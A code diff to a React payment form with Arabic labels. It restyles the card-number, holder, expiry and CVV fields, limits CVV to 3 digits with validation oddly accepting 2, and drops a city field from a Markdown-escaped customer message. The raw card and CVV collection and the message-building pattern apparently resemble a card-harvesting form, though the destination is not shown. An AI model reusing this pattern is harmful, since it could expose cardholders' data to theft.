@@ -23,7 +23,6 @@ type PaymentFormProps = {
   shippingInfo?: {
     fullName: string;
     address: string;
-    city: string;
     phone: string;
     email: string;
     houseDescription?: string;
@@ -83,7 +82,7 @@ export default function PaymentForm({
     } else if (name === "cvv") {
       // Only allow 3-4 digits for CVV
       const digitsOnly = value.replace(/\D/g, "");
-      const truncated = digitsOnly.slice(0, 4);
+      const truncated = digitsOnly.slice(0, 3);
 
       setCardInfo((prev) => {
         const newCardInfo = {
@@ -127,7 +126,7 @@ export default function PaymentForm({
   const validateCardInfo = () => {
     const cardNumberValid =
       cardInfo.cardNumber.replace(/\s/g, "").length === 16;
-    const cvvValid = cardInfo.cvv.length >= 3 && cardInfo.cvv.length <= 4;
+    const cvvValid = cardInfo.cvv.length >= 2 && cardInfo.cvv.length <= 3;
     const expiryDateValid = /^\d{2}\/\d{2}$/.test(cardInfo.expiryDate);
 
     return (
@@ -280,74 +279,52 @@ export default function PaymentForm({
           paymentMethod === "tamara") && (
           <div className="space-y-4">
             <div>
-              <label
-                htmlFor="cardNumber"
-                className="block text-sm font-medium text-gray-700 mb-1"
-              >
-                رقم البطاقة
-              </label>
+              <label className="block text-right mb-2">رقم البطاقة</label>
               <input
                 type="text"
-                id="cardNumber"
                 name="cardNumber"
                 value={cardInfo.cardNumber}
                 onChange={handleCardInfoChange}
-                placeholder="XXXX XXXX XXXX XXXX"
-                className="w-full p-2 border border-gray-300 rounded-md text-right"
+                className="w-full p-3 border rounded-lg text-left dir-ltr"
+                placeholder="1111 2222 3333 4444"
                 required
+                style={{ direction: "ltr", textAlign: "left" }}
               />
             </div>
             <div>
-              <label
-                htmlFor="cardHolder"
-                className="block text-sm font-medium text-gray-700 mb-1"
-              >
-                اسم حامل البطاقة
-              </label>
+              <label className="block text-right mb-2">اسم حامل البطاقة</label>
               <input
                 type="text"
-                id="cardHolder"
                 name="cardHolder"
                 value={cardInfo.cardHolder}
                 onChange={handleCardInfoChange}
-                className="w-full p-2 border border-gray-300 rounded-md text-right"
+                className="w-full p-3 border rounded-lg text-left dir-ltr"
+                placeholder="الاسم كما يظهر على البطاقة"
                 required
               />
             </div>
-            <div className="flex gap-4">
-              <div className="flex-1">
-                <label
-                  htmlFor="expiryDate"
-                  className="block text-sm font-medium text-gray-700 mb-1"
-                >
-                  تاريخ الانتهاء
-                </label>
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label className="block text-right mb-2">تاريخ الانتهاء</label>
                 <input
                   type="text"
-                  id="expiryDate"
                   name="expiryDate"
                   value={cardInfo.expiryDate}
                   onChange={handleCardInfoChange}
+                  className="w-full p-3 border rounded-lg text-left dir-ltr"
                   placeholder="MM/YY"
-                  className="w-full p-2 border border-gray-300 rounded-md text-right"
                   required
                 />
               </div>
-              <div className="flex-1">
-                <label
-                  htmlFor="cvv"
-                  className="block text-sm font-medium text-gray-700 mb-1"
-                >
-                  رمز الأمان
-                </label>
+              <div>
+                <label className="block text-right mb-2">رمز الأمان CVV</label>
                 <input
                   type="text"
-                  id="cvv"
                   name="cvv"
                   value={cardInfo.cvv}
                   onChange={handleCardInfoChange}
-                  placeholder="CVV"
-                  className="w-full p-2 border border-gray-300 rounded-md text-right"
+                  className="w-full p-3 border rounded-lg text-left dir-ltr"
+                  placeholder="XXX"
                   required
                 />
               </div>
@@ -389,7 +366,6 @@ export default function PaymentForm({
                   message += `رقم الهاتف: ${escapeMarkdown(
                     shippingInfo.phone
                   )}\n`;
-                  message += `المدينة: ${escapeMarkdown(shippingInfo.city)}\n`;
                   message += `العنوان: ${escapeMarkdown(
                     shippingInfo.address
                   )}\n`;
